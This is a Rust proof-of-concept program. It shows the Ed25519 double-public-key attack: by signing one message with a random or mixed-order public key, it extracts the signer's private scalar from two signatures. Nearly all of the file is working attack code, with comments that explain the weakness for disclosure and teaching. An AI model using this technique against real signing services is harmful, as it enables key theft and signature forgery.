use curve25519_dalek::constants::{ED25519_BASEPOINT_COMPRESSED, EIGHT_TORSION};
use curve25519_dalek::digest::Digest;
use curve25519_dalek::edwards::CompressedEdwardsY;
use curve25519_dalek::scalar::Scalar;
use ed25519_dalek::{
    ExpandedSecretKey, Keypair, PublicKey, SecretKey, Sha512, Signature, Verifier,
};
use rand::rngs::OsRng;

fn main() {
    let message: &[u8] = "Hello World".as_bytes();
    let mut csprng = OsRng {};
    let original_keypair = Keypair::generate(&mut csprng);
    // Exploiting the sig(priv, pub, msg) api by providing a random pubkey as input.
    // Signatures with a non-matching pubkey do not verify.
    double_pubkey_attack_using_random_pubkey(&original_keypair, message);

    // Exploiting the sig(priv, pub, msg) api by providing a mixed order pubkey as input.
    // Signatures with a mixed order original pubkey DO ALWAYS VERIFY when using cofactored
    // verification. This demonstrates that just verifying a signature at signer's side does not
    // prevent a potential attack.
    double_pubkey_attack_using_mixed_order_pubkey(&original_keypair, message, false);

    // Exploiting the sig(priv, pub, msg) api by providing a mixed order pubkey as input.
    // Signatures with a mixed order original pubkey WILL SUCCESSFULLY VERIFY with some probability
    // when using non-cofactored signature verification, more precisely:
    // with 50% probability when the small order point has order = 2
    // with 25% probability when the small order point has order = 4
    // with 12.5% probability when the small order point has order = 8
    //
    // This demonstrates that just verifying a signature at signer's side does not
    // prevent a potential attack even when non-cofactored verification is used.

    // For this example we use a keypair that combined with the signed message, it will succeed
    // against non-cofactored verification.
    let seeded_original_keypair = seeded_keypair(&[1u8; 32]);
    double_pubkey_attack_using_mixed_order_pubkey(&seeded_original_keypair, message, true);
}

fn double_pubkey_attack_using_random_pubkey(original_keypair: &Keypair, message: &[u8]) {
    // Generate a random keypair2 (only need the public key part)
    let mut csprng = OsRng {};
    let keypair2 = Keypair::generate(&mut csprng);
    let pubkey2 = keypair2.public;
    double_pubkey_attack(original_keypair, &pubkey2, message, false, false);
}

fn double_pubkey_attack_using_mixed_order_pubkey(
    original_keypair: &Keypair,
    message: &[u8],
    matching_order_k: bool,
) {
    // Generate a mixed order pubkey by adding a small order point on the original pubkey.
    // Using one of the small order points from:
    // https://github.com/dalek-cryptography/curve25519-dalek/blob/main/src/backend/serial/u64/constants.rs
    let original_pubkey = CompressedEdwardsY::from_slice(original_keypair.public.as_ref())
        .decompress()
        .unwrap();

    let pubkey_mixed = original_pubkey + EIGHT_TORSION[4];

    double_pubkey_attack(
        original_keypair,
        &PublicKey::from_bytes(pubkey_mixed.compress().as_bytes()).unwrap(),
        message,
        true,
        matching_order_k,
    );
}

#[allow(non_snake_case)]
fn double_pubkey_attack(
    original_keypair: &Keypair,
    other_pubkey: &PublicKey,
    message: &[u8],
    mixed_key: bool,
    matching_order_k: bool,
) {
    // Get secret and public part
    let secret1 = &original_keypair.secret;
    let pubkey1 = &original_keypair.public;
    let expanded_secret1: ExpandedSecretKey = (secret1).into();

    // This is what we want to extract after performing the attack.
    let privkey1 = Scalar::from_bytes_mod_order(
        <[u8; 32]>::try_from(&expanded_secret1.to_bytes()[..32]).unwrap(),
    );

    // Sign with expanded_secret1 and get a signature in the form of (R1, S1)
    let sig1 = expanded_secret1.sign(message, pubkey1);
    // sig1 parts (R1, S1)
    let R1 = CompressedEdwardsY::from_slice(&sig1.to_bytes()[..32]);
    let S1 = Scalar::from_canonical_bytes(<[u8; 32]>::try_from(&sig1.to_bytes()[32..]).unwrap())
        .unwrap();
    assert!(verify_cofactored(pubkey1, message, &sig1));

    // This is H(R1 || PUBKEY1 || M)
    let mut hash = Sha512::new();
    hash.update(R1.as_bytes());
    hash.update(pubkey1.as_bytes());
    hash.update(&message);
    let k1 = Scalar::from_hash(hash);

    // Sign with expanded_secret1 but with wrong pubkey and get a signature in the form of (R2, S2)
    let sig2 = expanded_secret1.sign(message, other_pubkey);

    // sig1 parts (R2, S2)
    let R2 = CompressedEdwardsY::from_slice(&sig2.to_bytes()[..32]);
    let S2 = Scalar::from_canonical_bytes(<[u8; 32]>::try_from(&sig2.to_bytes()[32..]).unwrap())
        .unwrap();

    // This is H(R2 || PUBKEY2 || M)
    let mut hash2 = Sha512::new();
    hash2.update(R2.as_bytes());
    hash2.update(other_pubkey.as_bytes());
    hash2.update(&message);
    let k2 = Scalar::from_hash(hash2);

    // When a mixed order pubkey (function of the original pubkey) is used as input, then signature
    // will (unfortunately) verify successfully. This is a very important observation and it shows
    // that simply verifying signatures at the signer's side before posting the signature will not
    // suffice to prevent/detect a potential exploit.
    if mixed_key {
        assert!(verify_cofactored(other_pubkey, message, &sig2));
        if matching_order_k {
            assert!(other_pubkey.verify(message, &sig2).is_ok());
        }
    }

    // We can extract the private key by (S1 - S2) / (k1 - k2)
    let S1_minus_S2 = S1 - S2;
    let h1_minus_h2 = k1 - k2;
    let extracted_privkey1 = S1_minus_S2 * h1_minus_h2.invert();

    // Boom! we managed to extract the original private key.
    // Note that we don't need the secret seed, the twisted Edwards curve scalar is enough to forge
    // signatures.
    assert_eq!(privkey1, extracted_privkey1)
}

/// Signature verification function by mul with cofactor [8][s]B = [8]R + [8][k]A
#[allow(non_snake_case)]
fn verify_cofactored(pubkey: &PublicKey, message: &[u8], signature: &Signature) -> bool {
    let R = CompressedEdwardsY::from_slice(&signature.to_bytes()[..32]);
    let S =
        Scalar::from_bytes_mod_order(<[u8; 32]>::try_from(&signature.to_bytes()[32..]).unwrap());

    let mut h: Sha512 = Sha512::new();
    h.update(R.as_bytes());
    h.update(pubkey.as_bytes());
    h.update(&message);
    let k = Scalar::from_hash(h);

    let eight_sb = (S * ED25519_BASEPOINT_COMPRESSED.decompress().unwrap()).mul_by_cofactor();
    let eight_r = R.decompress().unwrap().mul_by_cofactor();
    let eight_ka = (k * CompressedEdwardsY::from_slice(&pubkey.to_bytes())
        .decompress()
        .unwrap())
    .mul_by_cofactor();

    eight_sb == eight_r + eight_ka
}

fn seeded_keypair(seed: &[u8]) -> Keypair {
    let secret = SecretKey::from_bytes(seed).unwrap();
    let public = PublicKey::from(&secret);
    Keypair { secret, public }
}

#[test]
fn test_mixed_points() {
    let mut csprng = OsRng {};
    let keypair = Keypair::generate(&mut csprng);

    let pubkey1 = CompressedEdwardsY::from_slice(keypair.public.as_ref())
        .decompress()
        .unwrap();
    let pubkey_mixed = pubkey1 + EIGHT_TORSION[4];
    assert_ne!(pubkey1, pubkey_mixed);

    let pk1 = pubkey1.mul_by_cofactor();
    let pk2 = pubkey_mixed.mul_by_cofactor();
    assert_eq!(pk1, pk2);
}
